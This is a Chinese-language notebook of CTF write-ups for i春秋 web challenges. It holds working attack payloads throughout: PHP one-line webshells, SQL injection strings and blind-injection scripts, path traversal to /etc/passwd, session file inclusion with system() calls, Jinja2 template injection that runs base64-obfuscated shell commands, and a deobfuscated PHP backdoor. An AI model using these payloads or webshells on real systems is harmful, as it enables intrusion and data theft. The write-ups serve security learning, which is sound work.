# web

## flag在变量中（i春秋）

文件包含题

1. 这个代码的作用是如果匹配正则表达式/^\w*$/，就打印变量$$a，$a是hello，$$a是六位变量$hello

2. 由于$a在函数中，所以函数之外无法访问。如果要访问，将hello修改为超全局变量GLOBALS。

3. 在URL后加?hello=GLOBALS，将参数hello修改为Globals

实际执行语句：
```
eval("var_dump($$a);")
eval("var_dump($hello);")
eval("var_dump($GLOBALS);")
```
$GLOBALS的作用：引用全局作用域中可用的全部变量。就可以导出所有的变量

## flag不在变量中（i春秋）

查看globals变量，没有

网传waritup有两种：

/?hello=file_get_contents('flag.php')

/?hello=${@eval($_POST[1])}

都不成功，最后： ?hello=file("flag.php")

```
ile() 函数是把整个文件读入一个数组中，然后将文件作为一个数组返回。
readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 '@' 来隐藏错误输出。
file_get_contents() 把整个文件读入一个字符串中。
```

## 爆破3（i春秋）
```
<?php 
error_reporting(0);
session_start();
require('./flag.php');
if(!isset($_SESSION['nums'])){
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}

if($_SESSION['time']+120<time()){
  session_destroy();
}

$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];

if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
}

if($_SESSION['nums']>=10){
  echo $flag;
}

show_source(__FILE__);
?>
```
1、whoami需要等于传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++，所以构造calue为数组；
2、whoami=str_rands，循环10次后，输出flag。

大佬的脚本

```
import requests

url = "http://b49c840973a243d094483c60bf42a34e4c4b863cd17e4e51.changame.ichunqiu.com/?value[]=ea"
#al = ['abcdefghijklmnopqrstuvwxyz'] //这里没有理解，注释掉一样出来结果
s = requests.session()
r=s.get(url)

for i in range(20):
    url = "http://b49c840973a243d094483c60bf42a34e4c4b863cd17e4e51.changame.ichunqiu.com/?value[]=" + r.content[0:2]
    r=s.get(url)
    print r.content
```

## upload（i春秋）

上传一句话木马，访问php，@eval($_POST[1]); ?> ，发现<?被过滤

构造php

```
<script language="PHP">
   echo((file_get_contents('../flag.'.'php')));
</script>
```

## code（i春秋）

?jpg=index.php get参数读取源码，src中的base64解码

wp说和phpStorm有关，于是百度一下phpStorm，学习到phpstorm写的会有一个 .idea 文件夹，里面存储了一些配置文件，发现了fl3g_ichuqiu.php

```
$file = 'fl3gconfigichuqiu.php';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
$file = str_replace("config","_", $file);
```
源码中config替换成_

?jpg=fl3gconfigichuqiu.php，base64解码发现

```
<?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
error_reporting(E_ALL || ~E_NOTICE);
include('config.php');

//获取length位数的随机字符串
function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') {
    $hash = '';
    $max = strlen($chars) - 1;
    for($i = 0; $i < $length; $i++)	{
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}

//加密过程，txt是明文，key是秘钥
function encrypt($txt,$key){
    for($i=0;$i<strlen($txt);$i++){
        $tmp .= chr(ord($txt[$i])+10);				//txt内容的ascii码增加10
    }
    $txt = $tmp;
    $rnd=random(4);									//取4位随机字符
    $key=md5($rnd.$key);							//随机字符与秘钥进行拼接得到新的秘钥
    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) $s = 0;
        $ttmp .= $txt[$i] ^ $key[++$s];				//将明文与key按位进行异或
    }
    return base64_encode($rnd.$ttmp);				//base64加密
}

//解密过程，txt是密文，key是秘钥
function decrypt($txt,$key){
    $txt=base64_decode($txt);
    $rnd = substr($txt,0,4);						//减掉4位随机数		
    $txt = substr($txt,4);							//真正的密文
    $key=md5($rnd.$key);

    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) $s = 0;
        $tmp .= $txt[$i]^$key[++$s];				 //将密文与秘钥进行异或得到tmp
    }
    for($i=0;$i<strlen($tmp);$i++){
        $tmp1 .= chr(ord($tmp[$i])-10);
    }
    return $tmp1;									//明文
}
$username = decrypt($_COOKIE['user'],$key);			//获取cookie的内容
if ($username == 'system'){							//如果解密后等于system打印flag
    echo $flag;
}else{
    setcookie('user',encrypt('guest',$key));		//否则打印表情
    echo "╮(╯▽╰)╭";
}
?>
```

整个过程先解密验证username，r如果不符合再加密塞进cookie，

所以解题应该先解密，得到key， 再加密

大佬的脚本

```python
# _*_ coding: utf-8 _*
from base64 import *
import requests
import string

//设置URL
url='http://6d739233fb8c4844aaa45b57db9cbd81908d8ccb6ec64ed9.changame.ichunqiu.com/fl3g_ichuqiu.php'

cookie = requests.get(url).cookies['user']			#请求该URL，获取user的COOKIE值

txt = b64decode(cookie)								#将得到的cookie进行base64解码
rnd = txt[:4]		 								#密文前四位是随机字符
tmp = txt[4:]										#guest与key进行异或的密文，5位
key = list('123456')								#key为6位的字符，目前不知是啥
guest = list('guest')								#guest明文
system = list('system')									

for i in range(0,len(guest)):
	guest[i] = chr(ord(guest[i]) + 10)				#为加密做准备

for i in range(0,len(guest)):
	key[i] = chr(ord(tmp[i]) ^ ord(guest[i]))		#得到key的前五位

for i in range(0,len(system)):
	system[i] = chr(ord(system[i]) + 10)			#同样是为了加密做准备

//准备爆破key的第6位
s = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"

tmp_news = ''										#system与key的异或值
cookie_system = []
xstr = ""

for ch in s:
	key[5] = ch
	for i in range(0,len(system)):
		tmp_news += chr(ord(system[i]) ^ ord(key[i]))
	xstr = rnd + tmp_news							#随机字符与异或的结果拼接
	cookie_system.append(b64encode(xstr))			#base64加密，并加入到cookie_system中
	tmp_news = ""

print(cookie_system)

for i in cookie_system:
	cookie = {'user':i.decode()}					#设置cookie
	res = requests.get(url,cookies = cookie)		
	if "flag" in res.text:
		print res.text
```


## YeserCMS（i春秋）

https://www.cnblogs.com/RenoStudio/p/10541876.html

dirsearch 扫描，python3 dirsearch.py -u 链接 -e *

发现 /amin, /falg.php

cmseasy 漏洞

构造url：http://57f208a0b1164a51a627a8c5645433ee0a4fbc4fc36a4159.changame.ichunqiu.com//celive/live/header.php

1、试验--暴库

post：xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(database())) ),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>

2、拿表

post:

xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database() ),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>

 3、爆管理员账号密码

这里就不爆用户名字段名和密码字段名了，其实在这个站中就是username和password

xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx', (UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>

拿到用户名|密码，登录后台，文件读取，抓包读post参数../../flag.php

## SQL

sql注入题，发现关键字被过滤，用<>绕过过滤

?id=1+u<>nion+s<>elect 1,group_concat(flAg_T5ZNdrm),3 from info

### include（i春秋）

文件包含漏洞

搜索一下`allow_url_include `看看是否打开：

php://input协议，使用post传递参数<?php system("ls");?>

使用`php://filter/read=convert.base64-encode/resource=dle345aae.php`读取文件内容：

## 123（i春秋）

一句话木马大全

https://www.cnblogs.com/Rcsec/p/9426301.html

`<?=eval($_POST['cmd']);`

## zone（i春秋）

文件包含

抓包cookie:login=1 绕过登录

输入/manages/admin.php?module=ind../ex&name=php发现可以正常访问于是猜想../被替换为空，所以将../改为..././于是访问/manages/admin.php?module=..././..././..././etc/passwd&name=

发现site-enabled/dedault,查看发现存在目录遍历

URL/online-movies../ 

## SQLI（i春秋）

过滤，union连接用join


```
/l0gin.php?id=-1%27 union select * from (select group_concat(distinct(database()))) a join (select version()) b%23 

/l0gin.php?id=-1%27 union select * from (select group_concat(table_name) from information_schema.tables where table_schema='sqli') a join (select version()) b%23


/l0gin.php?id=-1%27 union select * from (select group_concat(column_name) from information_schema.columns where table_name='users') a join (select version()) b%23 

/l0gin.php?id=-1%27 union select * from (select group_concat(flag_9c861b688330) from users) a join (select version()) b%23 
```


## getflag（i春秋）

1. 先计算MD5值

```
import requests
import base64
import sys
import hashlib

def getmd5(index):
	for i in range(100000,100000000):
		x = i
		md5 = hashlib.md5(str(x).encode('utf8')).hexdigest()
		if md5[:6] == index:
			return x
	
print(getmd5('f4a552'))

```

2. 再登录，发现username存在注入，使用 admin'#登录成功
3. 登进去存在文件下载，提示flag.php在根目录
4. 根据文件下载路径，尝试下载flag.php, /Challenges/file/download.php?f=/var/www/html/Challenges/flag.php
5. 读源码，给/Challenges/flag.php添加post参数flag=flag，绕过验证


## SQLI（i春秋）

考点：php sprintf()格式化字符串漏洞

sprintf（）方法就是对15种类型做了匹配，15种类型以外的就直接break了没有做任何处理

如果我们输入"%\"或者"%1$\",他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么"%\","%1$\"就因为没有经过任何处理而被替换为空。

因此sprintf注入的原理就是，我们用一个15种类型之外的"\" 来代替格式字符类型让函数替换为空，则“%1$\'”后面的单引号就能闭合前面的单引号

脚本盲注

## upload（i春秋）

源码提示post的方法发送ichunqiu=你发现的东西

reposne的头部包含一个flag的base64,base64解码后用脚本post到url

```
import base64
import requests

def main():
    a = requests.session()
    b = a.get('http://d704458a0abd40959ff0de9e0e58f7fd776f4f848e8a442b.changame.ichunqiu.com/')
    key1 = b.headers['flag']
    c = base64.b64decode(key1)
    d = str(c).split(":")
    key = base64.b64decode(d[1])
    body = {"ichunqiu":key}
    f = a.post("http://d704458a0abd40959ff0de9e0e58f7fd776f4f848e8a442b.changame.ichunqiu.com/",data=body)
    print(f.text)

if __name__ == '__main__':
    main()

```
得到一个path字符串，访问这个url，是个登录页面，存在**svn源码泄露**

/3712901a08bb58557943ca31f3487b7d/.svn/wc.db，访问后提示MD5后的username

登录和前面getflag相似，先解md5验证码,登录后提示7815696ecbf1c96e6894b779456d330e.php,访问3712901a08bb58557943ca31f3487b7d/7815696ecbf1c96e6894b779456d330e.php

文件上传，改后缀为pht,获得flag

## hash（i春秋）

观察参数?key=123&hash=f9109d5f83921a551cf859f853afe7bb，查看源码提示$hash=md5($sign.$key);the length of $sign is 8，md5(f9109d5f83921a551cf859f853afe7bb)=kkkkk01123

构造payload: ?key=111&hash=md5(kkkkk01111)

提示访问Gu3ss_m3_h2h2.php，代码审计

反序列化绕过_wakeup,如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行 

```
<?php
class Demo {
    private $file = 'Gu3ss_m3_h2h2.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    function __wakeup() {
        if ($this->file != 'Gu3ss_m3_h2h2.php') {
            //the secret is in the f15g_1s_here.php
            $this->file = 'Gu3ss_m3_h2h2.php';
        }
    }}
	$a = new Demo('f15g_1s_here.php');
	$s = serialize($a);
	echo $s;
	echo '<br>';
	echo preg_match('/[oc]:\d+:/i', $s);
	$s=str_replace("4","4+",$s);
	//不明白为什么变成4+
	//O:4+:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";}
	$s=str_replace(":1:",":8:",$s);
	//O:4+:"Demo":8:{s:10:"Demofile";s:16:"f15g_1s_here.php";}
	echo preg_match('/[oc]:\d+:/i', $s);
	echo '<br>';
	echo base64_encode($s);
?>
```

绕过显示f15g_1s_here.php,addslashes转义，它会将我们的’”都进行转义

Payload：f15g_1s_here.php?val=${eval($_GET[a])}&a=echo `cat True_F1ag_i3_Here_233.php`;

writeup: https://www.cnblogs.com/wosun/p/11505950.html

## 再见CMS

1. 注册用户，记住uid和邮箱
2. 报错测试

```
ichunqiu.com/member/userinfo.php?job=edit&step=2
POST：
truename=ycc%0000&Limitword[000]=&email=ycc@qq.com&provinceid=
```

3. 爆破数据库名

```
ichunqiu.com/member/userinfo.php?job=edit&step=2
POST：
truename=ycc%0000&Limitword[000]=&email=ycc@qq.com&provinceid= , address=(select version()) where uid = 3 %23 
```

4. 爆破表

```
ichunqiu.com/member/userinfo.php?job=edit&step=2
POST：
truename=ycc%0000&Limitword[000]=&email=ycc@qq.com&provinceid= , address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where uid = 3 %23 
```
5.查列名

```
address=(select group_concat(distinct(column_name)) from information_schema.columns where table_name = (select distinct(table_name) from information_schema.tables where table_schema = database() limit 1) ) where uid = 3 %23 
```

sql注入 load_file，直接写成load_file('/var/www/html/flag.php')是不行的，引号会被转义，转成16进制

```
address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870) ) where uid = 3 %23 
```

## fuzzing（i春秋）

抓包发现response头部hint: ip,Large internal network

设置X-Forwarded-For:10.0.0.0，提示/m4nage.php

访问/m4nage.php，尝试post key=1，提示key is not right,md5(key)==="1b4167610ba3f2ac426a68488dbd89be",and the key is ichunqiu***,the * is in [a-z0-9]，post key=ichunqiu105，得到提示the next step: xx00xxoo.php

访问xx00xxoo.php，提示源码在x0.txt，访问后执行函数得到flag

## hello world

这题考的是git源码泄露，extract_git脚本扫描下载

对比flag.js和flag.js.04bb09，差异的地方就是flag

### notebook

session文件包含漏洞

/action.php?module=&file= 用文件包含打开phpinfo.php

打开phpinfo.php，可以看到open_basedir是/var/www/html/:/tmp，open_basedir是可将用户访问文件的活动范围限制在指定的区域。注意用open_basedir指定的限制实际上是前缀,而不是目录名。

用file=phpinfo.php，可以看到session.save_path是/temp/SESS，可以使用session包含，

注：浏览器后缀直接ichunqiu.com/phpinfo.php打开时，session.save_path和以上action文件执行不一致，不明白为什么

payload:?module=&file=../../../../tmp/SESS/sess_nlloqni0ef0tpqbt3jdj81rj75

注：注册登录后，你注册的账号在cookie里已设置了PHPSESSID，因此sess_nlloqni0ef0tpqbt3jdj81rj75就是sess_PHPSESSID

访问后可以看见用户名和uid，发现注册没有任何限制，注册用户名<?php system('cat flag.php'); ?>，登录后执行上面payload

一下博客详细介绍了session包含漏洞：https://blog.csdn.net/weixin_43803070/article/details/91047032

大佬的writeup:https://bbs.ichunqiu.com/thread-16750-1-1.html

https://www.jianshu.com/p/624fe6d09c0b


## blog（i春秋）

**insert注入**

留言板存在注入，猜测insert语句的值类似于: (username,title,content)
于是这里构造的insert语句类似于 ... values('aaa','testpayload2','test')#

这个payload过去报错了，这说明猜测的insert字段有误，既然不是三个，更不可能是两个，受控制的部分已经有两个了，因此推测insert语句的字段数为4.

查数据库名 title=1&content=test','X'),('aaa',(select database()),'content

查密码用户名 post: title=1&content=test','X'),('aaa',(SELECT group_concat(password) from users),'content

能看见一个密码是我刚才注册的 一个是admin的密码 登录admin,发现manager页面，存在文件包含

??module=php://filter/read=convert.base64-encode/resource=../flag&name=php

大佬的wp：https://blog.csdn.net/qq_30123355/article/details/58161312

## 登录（i春秋）
1.sql盲注

```
#-*- coding:utf-8 -*-
from urllib.request import urlopen 
from urllib import parse,request
import sys
import threading
 
url = 'http://002f115eb5d744f4a42ccb59fb06ef340f840a366d4147f0.changame.ichunqiu.com/Challenges/login.php'

def get_database_length():
	for i in range(1,sys.maxsize):
		username= "admin' or length(database())>{0}#"
		username = username.format(i) 
		values = {"username":username, 'password':''}   
		data = parse.urlencode(values).encode('utf-8')  
		response = request.Request(url, data)
		response = urlopen(response) 
		if len(response.read().decode()) != 4:
			print("当前数据库长度为：", i)
			return i

def get_database_name():
	global lock
	lit=list("0123456789qwertyuioplkjhgfdsazxcvbnmPOIUYTREWQASDFGHJKLMNBVCXZ")
	username="admin' or user() like '{0}%'#"
    # username="admin' or p3ss_w0rd like '{0}%'#"
	database=''
	print("Start to retrive the database") 
	while True:
		curId=0
		while True:  
			if curId == len(lit): 
				break
			i = curId
			curId += 1 
			un=username.format(database+lit[i])
			print(un)
			values = {"username":un, 'password':''}      
			data = parse.urlencode(values).encode('utf-8')  
			response = request.Request(url, data)
			response = urlopen(response) 
			if len(response.read().decode()) == 4: 
				database=database+lit[i]
				print("the database is :%s" % database)  
				break
		if curId == len(lit):
			print(database)
			break

print(get_database_length())
get_database_name()
```

盲注的脚本都没跑出来

2.git源码泄露

登录后提示/.bctfg1t，用gitstack下载源码`changame.ichunqiu.com/Challenges/.bctfg1t/`

之后执行git log，然后使用得到的commit，执行git reset --hard commit，回滚到之前的版本，再查看flag.php，啥变化都没有

然后大佬wp提示查cat /.git/refs/stash,获得版本的hash值，然后git reset --hard 哈希值

然后打开flag.php,提示flag在/71ec9d5ca5580c58d1872962c596ea71.php，或得flag，但是提交不正确

涉及到的git命令 

```
git cat-file -p hash值
git ls-tree hash值
```

也可以用git-extract，结果也是一样的，但是git-extranct不需要回滚版本，下载下来的是全部commit历史记录的文件

https://www.jianshu.com/p/0ea09975169d

https://www.jianshu.com/p/0ea09975169d

## sqli

https://blog.csdn.net/nzjdsds/article/details/82152085

## look（i春秋）

response头部显示verity,作为参数，注入4个字符显示error,注入5个字符显示过长，所以写个dic跑

```
from multiprocessing.pool import ThreadPool
from lxml import etree
from bs4 import BeautifulSoup
import logging

payload = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'

for i in xrange(32, 126+1):
    for i2 in xrange(32, 126+1):
        print('\'' + chr(i) + chr(i2) + '%23')
        
python look.py > look.dic
```
burp抓包跑，’%1# 注入成功，提示5211ec9dde53ee65bb02225117fba1e1.php，response提viminfo

访问 .viminfo配置文件，提示/var/www/icq/5211ec9dde53ee65bb02225117fba1e1.php.backup~~~

访问/5211ec9dde53ee65bb02225117fba1e1.php.backup，页面源码代码审计，有个set names utf8，使用ç=c绕过

注：MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写, Ä = A, Ö = O, Ü = U 这三种条件都成立, 对于utf8_general_ci下面的等式成立：ß = s ，但是，对于utf8_unicode_ci下面等式才成立：ß = ss 。
可以看到大写O和Ö是相等的

绕过后提示c3368f5eb5f8367fd548b228bee69ef2.php，访问后代码审计

```
<?php
if(isset($_GET['path']) && isset($_GET['filename'])){
    $path = $_GET['path'];
    $name = "upload/".$_GET['filename'];
}
else{
    show_source(__FILE__);
    exit();
}
if(strpos($name,'..') > -1){
    echo 'WTF';
    exit();
}

if(strpos($path,'http://127.0.0.1/') === 0){
    file_put_contents($name,file_get_contents($path));
}
else{
    echo 'path error';
}
?>
```

接受两个参数，不能上跳，读取path的内容写到/upload/$file里面，

wp 往5211ec9dde53ee65bb02225117fba1e1.php?usern3me=<?php phpinfo();?>注入一句话，需要二次url编码，尝试成功

最后 c3368f5eb5f8367fd548b228bee69ef2.php/?path=http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=<?php $_REQUEST[0];?>&filename=1.php二次编码写入成功

访问/upload/1.php?0=cat ../flag_is_here.php

大佬的write-up地址 

https://www.cnblogs.com/haozhizhi/p/10786382.html

https://www.ichunqiu.com/course/56485

## EXEC（i春秋）
1.wp提示/index.php.swp 源码泄露，访问/.index.php.swp

2.源码

```
/*
flag in flag233.php
*/
 function check($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '11259375';
}
if(isset($_GET[sign])&& check($_GET[sign])){
        setcookie('auth','tcp tunnel is forbidden!');
        if(isset($_POST['cmd'])){
                $command=$_POST[cmd];
                $result=exec($command);
                //echo $result;
        }
}else{
        die('no sign');
}
```

绕过check函数，将11259375转base64

3.



## fuzz (i春秋)

**考点：python模板注入**

[出题人讲解视频](https://www.ichunqiu.com/course/56487)

[Flask/Jinja2中的服务端模版注入（一）](https://www.freebuf.com/articles/web/98619.html)

[Flask/Jinja2中的服务端模版注入（二）](https://www.freebuf.com/articles/web/98928.html)

提示please fuzz，参数注入，基本的参数都试一试，?name=1时回显，尝试sql注入不成功

Flask/Jinja2中存在的SSTI漏洞读取和写入文件，尝试`?name={{config}}`，返回flask的config配置的字典对象


```
//向服务器写入文件，当编译完成为subprocess模块引入check_output方法，并将其设置指向变量RUNCMD
?name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
 
//注入'/tmp/owned.cfg'，向config对象添加一个新项
?name={{ config.from_pyfile('/tmp/owned.cfg') }}

//验证是否能运行命令行
?name={{ config['RUNCMD']('/usr/bin/id',shell=True) }}
```

执行命令 ls，不成功，执行pwd，成功回显，存在字符过滤，使用反引号注入base64编码后执行解码命令，例如`echo bHMK | base64 -d`

```
//执行ls，成功
?name={{ config['RUNCMD']('`echo bHMK | base64 -d`',shell=True) }} //echo bHMK | base64 -d 解码

//执行ls -a，成功
?name={{ config['RUNCMD']('`echo bHMgLWEK | base64 -d`',shell=True) }}

//打开网页主目录，ls -a /var/www/html，回显fl4g
?name={{ config['RUNCMD']('`echo bHMgLWEgL3Zhci93d3cvaHRtbAo= | base64 -d`',shell=True) }}

//执行cat命令，cat /var/www/html/fl4g
?name={{ config['RUNCMD']('`echo Y2F0IC92YXIvd3d3L2h0bWwvZmw0Zwo= | base64 -d`',shell=True) }}
```

## backdoor（i春秋）

1.访问/.git，响应码是403不是404，用githack下载.git，回滚到上一个commit,提示flag在b4ckdo0r.php

2.访问后提示你能耗到我的源码吗，访问/.b4ckdo0r.php.swo下载源码，注意b4ckdo0r前面的`.`，

3.下载后用恢复该文件，`vim -r b4ckdo0r.php.swo`，将内容拷贝到新建文件中，可以看到很多变量，但是就是一些字符串，打印$L变量，得到源码

```php
<?php
$kh="4f7f";
$kf="28d7";
function x($t,$k){
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}

$r=$_SERVER;
$rr=@$r["HTTP_REFERER"];
$ra=@$r["HTTP_ACCEPT_LANGUAGE"];
if($rr&&$ra){
    $u=parse_url($rr);
    parse_str($u["query"],$q);
    $q=array_values($q);
    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);
    if($q&&$m){
        @session_start();
        $s=&$_SESSION;
        $ss="substr";
        $sl="strtolower";
        $i=$m[1][0].$m[1][1];
        $h=$sl($ss(md5($i.$kh),0,3));
        $f=$sl($ss(md5($i.$kf),0,3));
        $p="";
        for($z=1;$z<count($m[1]);$z++)
            $p.=$q[$m[2][$z]];
        if(strpos($p,$h)===0){
            $s[$i]="";$p=$ss($p,3);
        }
        if(array_key_exists($i,$s)){
            $s[$i].=$p;$e=strpos($s[$i],$f);
            if($e){
                $k=$kh.$kf;
                ob_start();
                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));
                
                $o=ob_get_contents();
                ob_end_clean();
                $d=base64_encode(x(gzcompress($o),$k));
                print("<$k>$d</$k>");
                @session_destroy();
            }
        }
    }
}
?>
```

## ssrfme

看大佬wp得到的提示就是github上的开源项目Rtiny：https://github.com/r0ker/Rtiny-xss/tree/master

构造pass为数组，得到报错信息，提示Rtiny

这个项目存在多处sql注入点，查看项目源码可以发现除了pass,email参数外，还要构造username，并且经过`self.get_secure_cookie`塞进cookie里

解题：

1.本地搭建tornado，安装指令python -m pip install tornado，然后运行下列脚本，访问127.0.0.1/index，得到cookie里加密后的报错注入的username

```
# coding:utf-8
import tornado.ioloop
import tornado.web 
# @author: V0W
# @reference: https://blog.csdn.net/include_heqile/article/details/82591707

settings = { 
   "cookie_secret" : "M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=",
}

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        # 依次执行下列语句，爆破数据库，表，列和字段
        self.write("helloword")
        # self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select version()))) -- ")
        # self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())))-- ")
        # self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name='manager')))-- ")
        # self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,mid((select group_concat(username) from manager),30,62))) -- ")
        # self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select load_file('/var/www/html/f13g_ls_here.txt'))))#")
        self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,mid((select load_file('/var/www/html/f13g_ls_here.txt')),28,60)))#")
        self.write(self.get_secure_cookie("username"))

def make_app():
    return tornado.web.Application([
        (r"/index", MainHandler),
        ], **settings)

if __name__ == "__main__":
    app = make_app()
    app.listen(8089)
    tornado.ioloop.IOLoop.instance().start()
```

2.访问i春秋login，cookie里加入username，但是页面没有报错，将login改为lock后报错，并回显信息
![image](http://note.youdao.com/yws/res/688/C339F77E0B454474BE632AA22EAC0988)

3.最后爆破username和password时没有正确回显，可能是环境被破坏，按照wp的用户和密码也登录不正确，跳过

4.根据wp，flag在f13g_ls_here.txt下，构造注入语句回显flag，由于flag长度做了限制，所以分两步爆破

[大佬的wp](https://www.cnblogs.com/wosun/p/11675151.html)

## Mangager(i春秋)

1.登录抓包发现post时会有_nonce参数，一串字符，前端login.js发现一段代码，生成的就是这个串随机码

```js
function getnonce() {
    var text = "";
    var possible = "0123456789abcdef";
    for (var i = 0; i < 40; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}
```
尝试修改这串码发现提示不合法， 猜测是前后端通用的验证机制

2.在boptstrap.js里有一段sign函数，太长了，粘贴部分

```
$(document).ready(function() {
	$("#" + "f" + "r" + "m" + "l" + "o" + "g" + "i" + "n").submit(function(e) {
	    //z1,z2为username和passowrd的值
	    var z1 = $("#" + "u" + "s" + "e" + "r" + "n" + "a" + "m" + "e").val();
	    var z2 = $("#" + "p" + "a" + "s" + "s" + "w" + "o" + "r" + "d").val();
	    $('<' + 'i' + 'n' + 'p' + 'u' + 't' + '>').attr({
		    type: 'h' + 'i' + 'd' + 'd' + 'e' + 'n',
		    name: '_' + 'n' + 'o' + 'n' + 'c' + 'e',
		    //这里是重点，调用的这个sign函数
		    //第三个参数"YTY" + "0Yj" + "M0Y" + "2Rh" + "ZTZ" + "iMj" + "liZ" + "jFj" + "OTQ" + "xOD" + "=="，也就是"YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD=="
		    value: sign(z1 + z2, "YTY" + "0Yj" + "M0Y" + "2Rh" + "ZTZ" + "iMj" + "liZ" + "jFj" + "OTQ" + "xOD" + "==")
		}).appendTo('#' + 'f' + 'r' + 'm' + 'l' + 'o' + 'g' + 'i' + 'n');
	});
});

function sign (data, key) {
    var privateKey
    var i, j
    var W = new Array(80)
    var A, B, C, D, E
    var H0 = 0x97B5D3F1
    var H1 = 0x1F3D5B79
    var H2 = 0x684A2C0E
    var H3 = 0xE0C2A486
    var H4 = 0x33221100
    var H5 = 0xF0F0F0F0
    var temp
    var _RSA = function (n, s) {
        var t4 = (n << s) | (n >>> (32 - s))
        return t4
    }
    var _Rot = function (val) {
        var str = ''
        var i
        var v
        for (i = 7; i >= 0; i--) {
            v = (val >>> (i * 4)) & 0x0f
            str += v.toString(16)
        }
        return str
    }
    //前面都是废话，只有这里调用了参数
    str = unescape(encodeURIComponent(key + data))
    ...
```

用Python验证这个方法，与抓包显示一致

```
import hashlib

str="YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD==admin123"
print(hashlib.sha1(str).hexdigest())
//16fba050a134988ddff375d83ce4c18750f93870
```

最终盲注脚本
```
import hashlib
import string
import requests

def sha1(s):
    s = "YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD==" + s
    return hashlib.sha1(s).hexdigest()

url = 'http://b7bb9d7701ed444ca2a1fa62ed1375a17b58727eba0b48c4.changame.ichunqiu.com/login.php'

headers = {
    "Content-Type": 'application/x-www-form-urlencoded'
}

temp = ''
for i in xrange(1, 50):
    for p in xrange(32, 126+1):
        # payload = " 'or ascii(substr((database()), {}, 1)) = {}%23".format(i, p)
        # payload = " 'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='login'), {}, 1)) = {}%23".format(i, p)
        # payload = " 'or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'), {}, 1)) = {}%23".format(i, p)
        # payload = " 'or ascii(substr((select p@ssw0rd from users), {}, 1)) = {}%23".format(i, p)
        payload = " 'or ascii(substr(`p@ssw0rd`, {}, 1)) = {}%23".format(i, p)
        # print(p, payload)
        nonce = sha1(payload.replace('%23', '#') + '1')

        data = 'a={}&username={}&password=1&_nonce={}'.format('a'*26209, payload, nonce)
        r = requests.post(url, headers = headers, data=data)
        if len(r.content) == 782:
            temp += chr(p)
            print(temp)
            break
```

最后爆出admin和MyIchunq1uSuperL0ng&&SecurePa$$word，登录后就有了flag

